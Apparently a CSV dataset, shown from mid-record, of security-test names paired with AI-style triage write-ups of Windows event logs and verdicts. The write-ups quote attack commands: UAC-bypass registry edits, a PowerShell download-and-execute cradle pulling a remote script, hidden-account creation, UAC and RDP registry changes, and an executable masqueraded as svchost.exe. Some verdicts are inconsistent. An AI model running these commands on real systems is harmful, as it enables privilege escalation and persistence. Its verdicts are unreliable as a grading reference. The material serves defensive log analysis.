Given the observed behaviors, the following resolution is provided:

### Resolution: SUSPICIOUS

The activities noted in the logs indicate anomalous behavior consistent with potential compromise. The combination of registry modifications, high-level process executions, and elevated privileges suggests that further investigation is warranted to determine the intent and scope of these actions. It is recommended to:

- Analyze the specific source of the `admin_test` usage and its legitimacy.
- Review system changes around these events, particularly in registry and system configuration.
- Conduct a deeper investigation of network traffic and other logs to trace potential malicious activities or lateral movements.
- Consider performing a malware scan and integrity checks on security-critical system files."
Disable Windows Remote Desktop Protocol,"**Analysis:**

1. **Time Manipulation:**
   - In the System and Security logs, there are clear indications that the system time was altered: 
     - Event ID 1 and Event ID 4616 indicate a change in system time from ""2024-10-24 18:28:33.3228071"" to ""2024-10-24 18:28:28.8978156"". This change was executed by `C:\Windows\System32\svchost.exe`. The manipulation of system time is often associated with attempts to hide malicious activity or alter timestamps to hinder forensic investigations.

2. **Registry Modification:**
   - Sysmon event shows that `cmd.exe` was used to disable remote desktop connections by modifying the registry key:
     - `""cmd.exe"" /c reg add ""HKLM\\System\\CurrentControlSet\\Control\\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 1 /f`
   - This action could be a security measure to prevent remote access and might have been done for either legitimate or malicious reasons, depending on the context.

3. **Process Execution:**
   - A notable sequence involves the execution of multiple standard Windows tools (`whoami.exe`, `HOSTNAME.EXE`, `wevtutil.exe`) which are typically benign. However, the frequency and sequence of these processes can be indicative of reconnaissance or administrative scripts.
   - The Edge Update related activities could be routine update tasks. Though frequent and verbose, they align with activities expected during updates.

4. **Service Stops:**
   - The `edgeupdate` service stopped twice in rapid succession as indicated in the application logs. This could suggest service instability or a restart command issued by a script/system task.

5. **Integrity Level:**
   - The processes executed under the `SERVER002\admin_test` account have a high integrity level, suggesting actions were performed with elevated privileges. Some operations were performed using `NT AUTHORITY\SYSTEM`, indicating system-level access.

**Assessment:**

- The logs suggest operations that could be routine administrative tasks, particularly if performed by an authorized administrator. However, the time manipulation and registry change are significant indicators that raise concern.
- The frequent execution of system commands and use of `cmd.exe` for altering the registry setting related to remote desktop connections are suspicious.

**Resolution:**

- **SUSPICIOUS**: The activity within these logs requires additional context and validation. The system time manipulation and unauthorized registry modifications about remote access are particularly concerning. It is essential to:
  - Verify if these actions were planned maintenance or executed by authorized personnel.
  - Review user activity around the time of these changes to clarify the intent and access sources.
  - Enhance monitoring for unusual patterns involving sensitive operations like time changes and registry modifications.

Further investigation is necessary to confirm the nature of these activities and ensure the environment's security."
Headless Browser Accessing Mockbin,"Upon analyzing the provided Windows event logs, here are the observations related to potential indicators of malicious activity:

1. **Time Change Events (Event ID 4616 and 1):** 
   - The logs reveal multiple time change events within a short period (`Security Event ID 4616` and `Kernel-General Event ID 1`). While time changes can occur legitimately (e.g., due to time synchronization), frequent or unexpected changes can indicate tampering, potentially by malware attempting to obfuscate activities.

2. **Privileged Logons (Event ID 4672):**
   - There are numerous logon events with special privileges (e.g., `SeDebugPrivilege`), which are often targeted for misuse during post-exploitation activities. However, these are executed by the `SYSTEM` account, which is typically legitimate for regular system operations.

3. **Process Execution (Sysmon Event ID 1 and 5):**
   - `cmd.exe` executing with arguments (`cmd.exe /c start """" chrome --headless --disable-gpu ...`) is suspicious. The use of command line to execute a browser in headless mode suggests possible automation or scripted activity, which could be used for data exfiltration or command and control.
   - The use of `whoami.exe` and `hostname.exe` may suggest scripts or processes attempting to gather system information.

4. **Unusual PowerShell Activity:**
   - Multiple PowerShell executions are logged with restricted execution policy but no details of commands (`powershell.exe -ExecutionPolicy Restricted -Command...`). While PowerShell is a legitimate tool, its use in a restricted mode could hint at an attempt to run scripts that avoid transcription logging.

5. **Process Creation and Execution:**
   - `MicrosoftEdgeUpdate.exe` and various components have numerous entries, consistent with updates. However, repeated creations of the same process with various arguments could suggest something is potentially triggering these updates in an unexpected manner.

6. **Network-Related Events (Event ID 5379):**
   - Multiple events show attempts to read credentials from MicrosoftAccount and WindowsLive entries, which consistently failed. This could indicate an unauthorized attempt to access or enumerate login credentials.

**Overall Assessment:**
- The combination of frequent time changes, suspicious command execution (such as headless Chrome), and excessive PowerShell activities, alongside attempts to access credentials, fits the pattern of potentially suspicious activity which might warrant further investigation. These could also be non-malicious administrative actions under certain situations, hence they cannot be definitively labeled without further context.

**Recommended Resolution: SUSPICIOUS**

**Guidance:**
1. **Further Investigation:**
   - Confirm whether the observed activities align with expected administrative or routine tasks.
   - Investigate the context of the headless `chrome` command execution and the specifics of executed PowerShell commands.
   - Correlate time change events with legitimate server or application-level synchronizations or administrative actions.

2. **Monitor for Similar Activities:**
   - Set up alerting for unusual command-line arguments, especially involving web browsing or file transfers.
   - Enable detailed logging and monitoring of PowerShell activities, especially for non-standard executions.

3. **Credential Access Monitoring:**
   - Review access policies and attempt to correlate inappropriate credential access attempts with user activity logs to rule out unauthorized access attempts."
Bypass UAC using ComputerDefaults (PowerShell),"### Detailed Log Analysis

In analyzing the provided Windows event logs, particular attention was given to identifying signs of malicious activity. Below is the assessment based on the log entries from the Application, Windows PowerShell, Sysmon, System, and Security logs.

#### **PowerShell Log Findings**:
- A sequence of PowerShell commands was executed attempting registry modifications, including changes to the ""ms-settings"" shell open command key, which is potentially indicative of malicious behavior. The specific command:
  ```shell
  powershell.exe & {New-Item ""HKCU:\software\classes\ms-settings\shell\open\command"" -Force
  New-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force
  Set-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""(default)"" -Value ""C:\Windows\System32\cmd.exe"" -Force
  Start-Process ""C:\Windows\System32\ComputerDefaults.exe""}
  ```
  Such modifications can be used to achieve privilege escalation under certain conditions, potentially indicating an attempt to exploit a User Account Control (UAC) bypass.

#### **Sysmon Log Findings**:
- Consistent with the PowerShell activity, there is evidence of `powershell.exe` initiating suspicious registry edits, attempting to alter system behavior in a way often leveraged for persistence or privilege escalation.
- The Sysmon events track the execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`, but these do not appear immediately malicious without further context.
- Multiple entries for Microsoft Edge updates show expected behavior, though the repeated execution and logs of services stopping warrant monitoring to ensure it aligns with normal update behavior.

#### **Application and System Log Findings**:
- The Application logs are dominated by entries from Microsoft Defender, confirming its active status. This suggests no immediate deactivation or tampering with security products on the system.
- The System logs provide mostly benign information about time adjustments and do not indicate suspicious activities.

#### **Security Log Findings**:
- The Security log shows standard events, such as service account login (`4624`) and privilege assignments (`4672`), indicative of regular operations. No unauthorized access attempts or privilege escalations were logged here.

### Assessment and Resolution

The analysis identified potential malicious behavior stemming from the PowerShell logs with registry key modifications that are often observed in privilege escalation attacks.

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed

1. **Immediate Investigation**: Conduct forensic analysis of the Server002 system, focusing on user activity associated with `admin_test` to understand the context behind the PowerShell commands.
2. **Monitoring**: Increase monitoring of PowerShell execution activities, especially those involving registry changes and use of `Start-Process`.
3. **Security Controls**: Ensure that UAC and other endpoint protection measures are properly configured and operational to prevent privilege escalation.
4. **Endpoint Scanning**: Execute a comprehensive malware and vulnerability scan on the system to identify and remediate any potential threats or misconfigurations.

Masquerading - windows exe running as different windows exe,"Upon reviewing the provided Windows event logs, there are specific indicators that suggest potentially suspicious behavior that warrants further investigation. Below is a detailed analysis of the logs:

1. **Windows Update Logs**:
   - The logs indicate multiple security updates related to Microsoft Defender Antivirus, which appear normal and expected for system security maintenance. No anomalies were noted here.

2. **Sysmon Logs**:
   - A significant observation is the PowerShell activity with a command-line execution `'powershell.exe' & {copy ""$env:ComSpec"" ($env:TEMP + ""\\svchost.exe""), $mydata_003 = (Start-Process -PassThru -FilePath ($env:TEMP + ""\\svchost.exe"")).Id, Stop-Process -ID $mydata_003}`. This activity is highly suspicious as it involves copying the command processor and executing it from a temporary location, a technique often employed in malicious activities such as fileless malware attacks.
   - Processes like `wevtutil.exe` and `conhost.exe` are executed multiple times, potentially as a part of normal administrative tasks, but in conjunction with the PowerShell activity, these could indicate an attempt to hide or manipulate logs.

3. **Security Logs**:
   - Various credential-related events are logged (EventID 5379) indicating issues related to the retrieval of Microsoft account credentials with a return code of ""3221226021,"" which signifies a 'Credential delegation failure'. Although problematic, without additional context, these entries are not overtly malicious but could indicate an attempted unauthorized access.

4. **PowerShell Logs**:
   - The execution commands shown in the PowerShell event logs reflect the same suspicious activity identified in the Sysmon logs, confirming its execution and suggesting unauthorized PowerShell script usage.

5. **Application Logs**:
   - No significant malicious activity is noted in the Application logs; they appear consistent with regular application usage and updates.

**Assessment:**
- The presence of the PowerShell script that copies and executes `svchost.exe` from a temporary directory is a strong indication of malicious activity. This suggests a potential attempt to run an unauthorized executable in a manner designed to evade detection, commonly indicative of malware or hacking attempts.

**Resolution:**
- **MALICIOUS** - The identified PowerShell activities and usage of temporary directories suggest potential compromise of the system.

WMI Win32_Product Class - Execute Local MSI file with embedded VBScript,"Upon reviewing the provided logs, several areas stand out as potentially suspicious and warrant further investigation. Below is a detailed breakdown:

### Windows PowerShell Logs:
- There are multiple instances of PowerShell being invoked with unusual command-line arguments, specifically:
  - **PowerShell Usage:** `""powershell.exe & {Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_VBScript.msi' }}""`. This command is indicative of an installation attempt using a local MSI package. The location of the MSI is in a temporary user directory, which can be indicative of a stealthy or malicious action.
  - **VBScript Execution Notice:** Another PowerShell session is initiated with the command-line `-nop -Command Write-Host VBScript executed me!; exit`. The `-nop` argument (no profile) combined with a script indicating VBScript interaction suggests possible obfuscation or a hidden action being taken by leveraging PowerShell, commonly seen in attacks.

### Application Logs:
- **MsiInstaller Events:**
  - EventID 1040 indicates an attempted installation from the path found in the PowerShell log (`data.007_VBScript.msi`).
  - EventID 11707 confirms that the installation of ""file file Test Installer"" was completed successfully. The generic naming (""file file Test Installer"") along with its unusual path raises suspicion about its legitimacy.

### Sysmon Logs:
- PowerShell and Msiexec are executed by the user `SERVER002\\admin_test`, and both show high integrity in their operation. The presence of high integrity mode combined with the execution from a temporary directory could mean unauthorized privileges were leveraged for execution.
- **Process Guids Linking Msiexec to PowerShell:** Msiexec execution (`C:\\Windows\\System32\\MsiExec.exe -Embedding`) is shown as a parent of PowerShell executing potentially malicious or suspicious command lines. This sequence aligns with the suspicious activities found in other logs.
- **Multiple Trusted Windows Utilities Involved:** Executions of `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe` all within a very short time frame and with high integrity level may suggest part of a script or automated attack process. 

These logs showcase potentially harmful actions involving process execution from temporary directories, consistent with malicious practices where scripts are used to execute further actions, often with attempts to increase privileges or evade detection.

### Conclusion:
Based on these findings, I assess the activity as **SUSPICIOUS**. It contains elements that strongly indicate an anomaly consistent with either a misconfigured script or a potentially malicious activity that mirrors typical behavior observed in penetration testing or malicious internal applications. 

### Recommendations:
1. **Immediate Action:** Quarantine and investigate the file `data.007_VBScript.msi` found in the temporary directory.
2. **User Account Review:** Investigate user `SERVER002\\admin_test` for any unauthorized access or suspicious behavior.
3. **System Monitoring:** Enhance real-time monitoring of PowerShell and MSI activities on critical systems, specifically concerning scripts from non-standard directories.
4. **Follow-up Analysis:** Conduct a more thorough inspection of related user activities and cross-check with other event logs or security tools for correlating indicators.

We should pursue further investigation of the involved user, file, and activities to determine whether there is an intrusion or misconfigured software causing these log entries."
UACME Bypass Method 23,"Upon a detailed analysis of the provided Windows event logs, I observed several key points that may indicate potential security concerns:

1. **Cmd.exe and PowerShell.exe Execution**: There is a series of Sysmon events showing the execution of `cmd.exe` and `powershell.exe`. Notably, the command line for `cmd.exe` involves an indirect reference to the execution of a file named `23 Akagi64.exe` located in a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script\\`). This behavior can be considered suspicious, as running executables from temporary directories is a known tactic used by attackers to evade detection.

2. **High Integrity Level**: The execution context shows that these commands were run with a high integrity level, which means they have administrator privileges. This could imply potential privilege escalation or misuse of administrative access.

3. **Use of General Windows Tools**: Other events indicate the use of various Windows tools, such as `wevtutil.exe`, `whoami.exe`, and `hostname.exe`. While these tools can be legitimate, their usage alongside suspicious command execution may be part of a method to gather system information or alter logs potentially as part of an attack chain.

4. **Presence of Microsoft Edge Update**: The logs also capture Microsoft Edge update activities which appear standard and usually run under the `NT AUTHORITY\\SYSTEM` user. Without additional context, these appear benign.

5. **Lack of Detailed Security and System Logs**: It is peculiar that the security and system logs are empty or not provided, which can hinder full analysis and might raise suspicion about log manipulation.

**Assessment and Conclusion**:

- **SUSPICIOUS**: Given the context, the specific command executions involving scripts from a temporary directory and the use of `cmd.exe` and `powershell.exe` with administrative privileges raise concerns. These activities are indicative of potential malicious behavior or at least actions that warrant further investigation. The absence of detailed security logs could be an indicator of log tampering.

**Recommendation**:

- **Further Investigation**: Conduct a detailed forensic analysis of the involved host to identify if these actions were authorized and whether `23 Akagi64.exe` is a known or unknown executable. Validate its origin and integrity.
- **Threat Hunting**: Initiate a threat-hunting exercise to confirm whether this behavior is part of a broader pattern across other systems.
- **Behavioral Monitoring**: Deploy endpoint detection and response (EDR) solutions to monitor similar behavior and alert on future occurrences.

This resolution should provide a foundation for approaching the potential scope of this incident and deciding on further actions required to secure the environment."
Create a Hidden User Called $,"Upon analyzing the provided Windows event logs for Server002, several suspicious activities have been identified:

1. **Security and User Account Changes:**
   - Event ID 4720 indicates the creation of a new user account with the username `$`. This account name is peculiar and does not follow conventional naming practices, which can be indicative of an attempt to create a backdoor account.
   - Event ID 4722 shows the enabling of the previously created account `$`.
   - Event ID 4724 suggests that a password was set for the user `$`, further pointing towards malicious intent, as this account setup happened rapidly in a short time span.

2. **Command Execution:**
   - A command was executed to add a new user (`cmd.exe /c net user $ file123! /add /active:yes`). The use of the `/add /active:yes` flags indicates a deliberate action to create and activate a new user account, which is consistent with the user account changes observed in the Security logs.

3. **Sysmon Logs:**
   - Sysmon logs indicate the execution of several processes tied to system management and user information utilities such as `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`. While these commands by themselves are not inherently malicious, their clustering with user account changes suggests potential reconnaissance and system manipulation activities by an attacker.
   - These processes are executed by the user `admin_test`, which could be an indication of privilege misuse or compromise of this particular administrative account.

4. **Overall Timing and Context:**
   - The logs demonstrate a sequence of actions conducted in quick succession, all surrounding the creation and activation of a suspicious user account. This timeframe suggests a scripted or automated action, commonly observed in malicious activities.

**Resolution: MALICIOUS**
The collected evidence strongly indicates malicious activity. A suspicious account `$` was created and activated using elevated privileges within a short timeframe, coinciding with the execution of system-level commands. There is a consistent pattern suggesting intentional manipulation of user accounts, typically associated with unauthorized access and system compromise.

**Guidance on How to Proceed:**
- Immediately disable the created user account `$` and investigate any associated privileges or access it may have been given.
- Conduct a thorough review of account activities for `admin_test` to ascertain whether it has been compromised.
- Inspect other systems for similar anomalous activities, as this event may signify a broader attack attempt.
- Enhance monitoring for privileged account activities, particularly for rapid sequence user creation, command execution, and other administrative actions.
- Consider implementing additional security controls, such as multi-factor authentication for administrative accounts, to mitigate similar risks in the future.
"
WinPwn - UAC Bypass DiskCleanup technique,"Upon reviewing the provided Windows event logs, the following findings and assessments were made:

### Security Log:
- **Event ID 4616** pertains to system time changes. The logs show the time being adjusted by ""svchost.exe"" under the ""LOCAL SERVICE"" account. While this could be normal behavior due to time synchronization, it's noted that adjustments happened within seconds and involve a trusted process (""svchost.exe""). This doesn't immediately indicate malicious activity but is worth monitoring for anomalies or patterns.

### Windows PowerShell Log:
- There is a significant indicator of potentially malicious activity in the PowerShell logs. The command involves downloading and executing a script from a remote repository:
  ```
  iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1')
  ```
  - This execution pattern is suspicious and indicative of potential ""Living off the Land"" attacks where attackers utilize built-in administrative tools like PowerShell to execute malicious commands. This action initiates an external script execution, which is typical in malicious scenarios.

### System Log:
- **Event IDs 1 and 24** detail time changes and timezone settings. These are typically benign, especially when executed by system processes. Coupled with Security Log events, there is no additional evidence of malicious intent here.

### Application Log:
- Events from ""SecurityCenter"" reflect normal operations of Windows Defender, indicating that it is operational. There are no immediate security threats noted in these logs related to system protection or antivirus configuration.

### Sysmon Log:
- Multiple instances of `wevtutil.exe` and `conhost.exe` execution are captured but without unusual command line arguments, indicating typical use cases of interacting with event logs or hosting console windows. However, their frequency may indicate a script execution loop, possibly related to the earlier PowerShell activity.
- The Sysmon logs also show execution of `HOSTNAME.EXE`, `whoami.exe`, and notably, PowerShell executing a suspicious script.
  
### Assessment:
Given the evidence, the key indicator of potential malicious activity is the PowerShell command that downloads and executes a script from a remote location. This is a strong indicator of potential compromise given the context and typical misuse in attack scenarios.

### Resolution:
- **SUSPICIOUS**: The logs contain evidence of suspicious activity due to the PowerShell script execution. This needs further investigation to determine the nature of the script and its impact on the system. Given the nature of the evidence, I recommend taking immediate steps to conduct a deeper investigation:
  - Block any further network communications to/from the involved URLs.
  - Analyze the downloaded script for malicious intent and functions.
  - Conduct a thorough system scan for persistent threats or malware.
  - Review user activity leading up to the event for further context on potential compromise."
Copy and Modify Mailbox Data on Windows,"**Detailed Analysis of the Logs:**

1. **Application Log:**
   - The log entry from ""Software Protection Platform Service"" appears routine, indicating typical software protection actions. No signs of malicious activity were detected.

2. **Windows PowerShell Log:**
   - The logs indicate the execution of a PowerShell script that:
     - Creates a directory.
     - Copies items from a specific path to another.
     - Modifies files by appending text to them.
   - The PowerShell command usage for file manipulation and modification is not inherently malicious, but it does warrant further context on why these actions were performed, especially the modification of files with ""Modification for file Red Test."" There might be a legitimate reason, such as maintenance or data restructuring, but without additional context, it is unusual and could be part of a malicious script aiming to manipulate data stealthily.

3. **Security Log:**
   - Two time-change events were recorded, facilitated by ""svchost.exe"" under the ""LOCAL SERVICE"" account. While not necessarily suspicious, unsanctioned time changes can sometimes be an indicator of time stomping techniques used to obfuscate file activity timestamps.

4. **Sysmon Log:**
   - Evidence of several command-line utilities like ""wevtutil.exe,"" ""conhost.exe,"" ""hostname.exe,"" and ""whoami.exe"" being executed by ""SERVER002\admin_test"" user. 
   - The use of ""wevtutil.exe"" and ""whoami.exe"" could indicate reconnaissance activity. These tools are often used to gather system information or manipulate event logs.
   - Multiple executions of ""powershell.exe"" align with the PowerShell logs showing the execution of scripts.

5. **System Log:**
   - The events regarding time synchronization with ""time.windows.com"" are typical background operations and don't indicate a security breach.

**Assessment:**
- **Suspicious Behavior:** The PowerShell activity is not common for regular user operations, especially when combined with the fact that files are being modified. Additionally, the execution of system utilities under the ""admin_test"" user emphasizes this suspicion. These signs could reflect preparatory steps for a malicious operation or post-exploitation behavior.
- **Threats/Risks:** Potential misuse of administrative credentials, script execution for unauthorized data manipulation, and possible attempts to alter system logs or configurations.

**Guidance on How to Proceed:**
- **Further Investigation Required:** 
   - Review recent changes in user account permissions, especially ""admin_test.""
   - Verify if there were any authorized tasks involving PowerShell scripts by ""admin_test.""
   - Monitor network activity from Server002 for any suspicious outbound traffic.
   - Conduct a vulnerability assessment of the host to ensure no exploitable weaknesses remain.

**Resolution:**
- **SUSPICIOUS:** The logs reveal activities that are not definitively malicious but certainly require further investigation as they deviate from typical behavior and could be indicative of unauthorized actions or preparations for further exploitation."
Windows Add Registry Value to Load Service in Safe Mode without Network,"### Analysis of the Windows Event Logs

#### Observations:

1. **System Log**:
   - The system log shows routine time change activities managed by the `svchost.exe` process, typically associated with the Windows Time Service. A slight adjustment in time is noted, which is generally benign if caused by legitimate time synchronization with time servers (e.g., `time.windows.com`).

2. **Application Log**:
   - The `edgeupdate` service is seen stopping twice within a few seconds. While not inherently malicious, repeated stopping could be checked to understand normal behavior for this service. 
   - There's an event related to the `Software Protection Platform Service` for a periodic timestamp, indicating routine operation.

3. **Sysmon Log**:
   - Multiple instances of conhost.exe and wevtutil.exe are launched, which are typically legitimate processes. However, their frequent invocation, especially shortly after each other, could be further investigated to rule out misuse.
   - The log includes common commands executed by `cmd.exe` like updating Windows Registry keys related to SafeBoot, which can seem suspicious if done without following IT operations change management. Modifications to SafeBoot entries can be indicative of attempts to maintain persistence or modify system boot behavior.
   - Legitimate system updates for Microsoft Edge are evident, showing processes related to `MicrosoftEdgeUpdate.exe`, which engage in usual update operations.
   - Events show `whoami.exe` being executed, which is generally benign unless used within a sequence indicating reconnaissance or privilege escalation activities without user action or context justifying it.

4. **Security Log**:
   - Shows two entries about time changes performed by the process `svchost.exe` by the `LOCAL SERVICE` account. These align with routine activities seen in the system log.

5. **Windows PowerShell Log**:
   - No entries provided, which limits the visibility of potential PowerShell-driven activities.

#### Indicators of Potential Suspicion:

- **Registry Modifications**: The command seen executing via `cmd.exe` to add registry entries could be highly suspicious in nature:
  ```bash
  ""cmd.exe"" /c REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\fileSafeMode"" /VE /T REG_SZ /F /D ""Service""
  ```
  This kind of action may indicate an attempt to ensure persistence or manipulate Safe Boot configurations, often seen in malicious activities.

- **Frequent Execution of Critical Utilities**:
  - The repeated and quick succession of `conhost.exe` and `wevtutil.exe` can be worth further inspection, as attackers may attempt to clear logs or interact with console processes for nefarious purposes.

#### Conclusion:

Given the nature of certain registry modifications without clear context, along with potentially abnormal high-frequency execution of specific utilities, further investigations are warranted. 

### Resolution: **SUSPICIOUS**

**Recommendations**:
- **Further Investigation**: Conduct more detailed analysis into the context and origin of the registry changes.
- **Audit User Activity**: Look for logs related to `admin_test` and potentially other accounts revealing unexpected activities.
- **Examine Event Frequency**: Determine context around the high occurrence of wevtutil.exe and conhost.exe to justify the observed pattern.
- **Security Monitoring**: Strengthen monitoring around registry modifications and ensure correlation with authorized change activities and access logs.
- **Use Analysis Tools**: Employ threat hunting tools or SIEM correlation to check for similarly associated activities across the network."
Copy and Delete Mailbox Data on Windows,"After reviewing the provided log entries, I have identified the following observations:

1. **Sysmon Log Entries:**
   - Multiple instances of `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe` processes are executing with various command-line arguments like `/regserver`, `/svc`, `/c`, `/ua /installsource core`, and `/ping`. This is typical behavior for an update service that checks, registers, and updates Microsoft Edge.
   - These processes run under the `NT AUTHORITY\SYSTEM` user, which is consistent with the privileges granted to update services. The integrity level is set to System, which is also typical for such services.
   - The hash values for `MicrosoftEdgeUpdate.exe` and related executables are consistent across different instances, indicating no changes or tampering at the binary level.

2. **PowerShell Log Entries:**
   - A PowerShell command execution is identified with the intent to create a directory, copy items, and then delete the directory. The command includes creating a directory for `$env:USERNAME\AppData\Local\Comms\Unistore\data\copy` and involves handling files within a local user’s directory.
   - The PowerShell script seems unusual given its operation on user data in the `Comms\Unistore\data` path, but the command does not show direct signs of malicious intent such as downloading malicious payloads or calling suspicious URLs.

3. **Time Change Observations:**
   - There are several Kernel-General event logs indicating changes in system time. Such log entries can be typical for time synchronization updates via NTP (network time protocol), recorded by the time service log.
   - Event IDs like 24 and 1 along with Event ID 35 in the System log reference time adjustments via `svchost.exe`, correlating with time synchronization processes, not nefarious actions.

4. **Security Log:**
   - Specific attention to event ID 4616 showing time changes with the involved processes `svchost.exe` most likely indicates regular time synchronization tasks rather than time tampering for malicious purposes.

5. **Command Line and Execution Context:**
   - Execution of common Windows utilities such as `conhost.exe`, `whoami.exe`, and `hostname.exe` from Sysmon logs indicate standard operations. Their frequent invocation by the `admin_test` user is not uncommon in environments where administrative activities are conducted.
   - There were no indicators of privilege escalation attempts or anomalous behaviors beyond standard execution of administrator-level tasks.

**Assessment:**
- **BENIGN:** The log activities appear to represent routine maintenance and update operations, particularly focused on Microsoft Edge updates and PowerShell executions which do not demonstrate malicious intent. The observed behavior aligns with standard system and software update procedures, routine use of administrative commands, and expected system time synchronization actions.

Based on this analysis, no concrete signs of compromise or malicious activities have been detected within these logs. The activities, while noteworthy from an update and administrative perspective, remain benign in nature. Regular review and adherence to structured logging and monitoring will continue to play a vital role in maintaining security oversight."
Rundll32 execute command via FileProtocolHandler,"Upon analysis of the provided Windows event logs from the System, Security, Sysmon, and Application logs, here are the key observations:

### System Log:
- The logs indicate regular system activity, such as time updates (`EventID: 24` and `EventID: 1`) by `C:\Windows\System32\svchost.exe`. Time synchronization activities are visible (`EventID: 35`) with the network time protocol.

### Security Log:
- Time change events (`EventID: 4616`) are seen, which match the time updates in the System logs. These events were initiated by `svchost.exe` as the `LOCAL SERVICE`, which is expected behavior for time synchronization.

### Sysmon Log:
- The process creation and file modification events appear ordinary. Processes like `whoami.exe`, `conhost.exe`, and Microsoft Edge Update processes (`MicrosoftEdgeUpdateComRegisterShell64.exe`) were executed. 
- A notable point is the execution of `cmd.exe` with a command line executing `rundll32.exe url.dll,FileProtocolHandler calc.exe`. This command tries to open the calculator, which is typically indicative of a potentially suspicious action used for testing or scripting purposes. However, without more context or repetitive abnormal behavior, this might not conclusively be malicious but rather a testing or scheduled task behavior.
- Execution of calculator could be used to bypass certain restrictions a plain `Calc.exe` execution might get flagged by. The presence of `wsmprovhost.exe` as a parent process suggests that remote management tasks could be running, which can be normal if administrators are performing remote tasks.

### Application Log:
- The application log mentions the stopping of the Edge Update service, a typical operation post-update or based on service control.

### Overall Assessment:
- **Benign Activities:** The events regarding time synchronization, Microsoft Edge Update tool, and some administrative tools like `whoami` and `hostname` are generally benign, indicative of regular system upkeep and status checks.
- **Potentially Suspicious Activity:** The `cmd.exe` -> `rundll32.exe` invocation to launch calculator suggests unconventional execution, often used for scripting or to evade detection, though once within the provided context is not immediately indicative of malicious activity.

### Conclusion:
This log set doesn't show concrete signs of malware. However, due to the presence of suspicious command execution potentially used for testing or automation, the execution of `cmd.exe` with the use of `rundll32` to open `calc.exe`, further investigation into who executed this command and why it was executed might be warranted. 

Therefore, based on the findings detailed above, the logs are categorized as **SUSPICIOUS** due to the specific process execution that may merit further scrutiny. Further actions or inquiries should include:
1. Verification with user/admin who may have invoked the command.
2. Checking if it aligns with known scheduled tasks or administrative scripts.
3. Ensuring that the configuration management system didn’t use this instruction as a part of legitimate update or audit functions."
Msiexec.exe - Execute Local MSI file with embedded VBScript,"## Analysis

Upon reviewing the provided Windows event logs from the Application, Security, System, Windows PowerShell, and Sysmon logs, here are the key findings:

### Application Log
- **Event ID 1040, 11707, 1033, 1042**: These events indicate the installation of an MSI package located in a temp folder (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_VBScript.msi`). MSI installations from temp directories can be suspicious if not associated with legitimate administrative activity or software deployment processes. 

- **Security UserID**: The UserID changes from `S-1-5-21-3962163828-2803415714-1403596700-1006` to `S-1-5-18` during Event ID 1042, which suggests a possible privilege escalation or different context execution which should be further verified with legitimate system uses.

### Security Log
- **Time Changes (Event ID 4616)**: There are instances of the system time being changed multiple times. While time changes are not inherently malicious, they are notable if unauthorized or unexpected, as attackers could use them to cover tracks or disrupt logging.

### System Log
- **Time Zone and Time Adjustments**: Multiple kernel general (Event ID 1 and 24) events show adjustments to time. Again, frequent time setting changes could be suspicious if not accounted for by a legitimate process.

### Windows PowerShell Log
- **PowerShell Execution**: There are events indicating the execution of PowerShell with the command: `powershell.exe -nop -Command Write-Host VBScript executed me!; exit`. The use of `-nop` (no profile) and direct execution of a script within a PowerShell command can be a tactic for executing malicious scripts without detection, especially if it correlates with unauthorized actions or unexpected installations.

### Sysmon Log
- **Process Creations**: 
  - Several processes such as `cmd.exe`, `msiexec.exe`, and `powershell.exe` were created. Of note is the use of `cmd.exe` to run an MSI install with `/q` for quiet installation, which can be a sign of a script or program installing software without user interaction.
  - **Parent Process**: The parent of several notable processes (`msiexec.exe`, `WindowsPowerShell`, etc.) is `wsmprovhost.exe`, which could imply actions triggered via Windows Remote Management (WinRM) if not used regularly in this context.
  
## Assessment

Based on the provided events, the behavior suggests potential malicious activity due to the following reasons:
- Unusual time adjustments could be an attempt to tamper with logging integrity.
- The execution of installments and scripts from temporary directories using quiet modes and PowerShell `-nop` flag are typical indicators of compromise.
- The presence of MSI installation scripts and PowerShell commands suggest an attempt to execute potentially unauthorized changes on the system, possibly indicating an intrusion or malware activity if not associated with scheduled admin activities.

## Conclusion

**Resolution: MALICIOUS**

The logs indicate signs consistent with potential malicious activity due to the execution patterns and context, particularly involving MSI installations with potentially suspicious origins, PowerShell script executions, and potentially unauthorized privilege escalation. Immediate action should include isolating the host for further forensic analysis, initiating a detailed investigation to discern any unauthorized changes, and verifying whether these actions correlate with expected system management tasks. Implement monitoring and potential incident response protocols as warranted by organizational policy."
Disable ConsentPromptBehaviorAdmin via registry keys,"Upon reviewing the provided Windows event logs, I have identified the following key points and potential indicators of suspicious activity:

1. **Unusual Use of Command-Line Tools:**
   - The `wevtutil.exe` tool is executed multiple times by the user ""SERVER002\\admin_test"". While `wevtutil.exe` is a legitimate Windows tool used to manage event logs, frequent use of such a tool, especially without a clear administrative need, might indicate an attempt to clear or manipulate event logs to cover tracks.
   
2. **Registry Modification:**
   - A process (`cmd.exe`) is observed executing a command to modify the Windows registry setting for ""ConsentPromptBehaviorAdmin"" through `reg add`. This action is directly modifying User Account Control (UAC) settings to change consent prompt behavior for administrators, which could bypass security restrictions and is typically an indicator of privilege escalation attempts or preparation for further exploitation.
   - Modification command: `""cmd.exe"" /c reg add ""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f`
   
3. **Multiple Logon Events:**
   - The logs show multiple login attempts/logon events for the user ""admin_test"" on the system ""SERVER002"" via NTLM over network logon type (LogonType 3). This behavior could be normal for certain environments but might need investigation to ensure these are expected administrative actions.

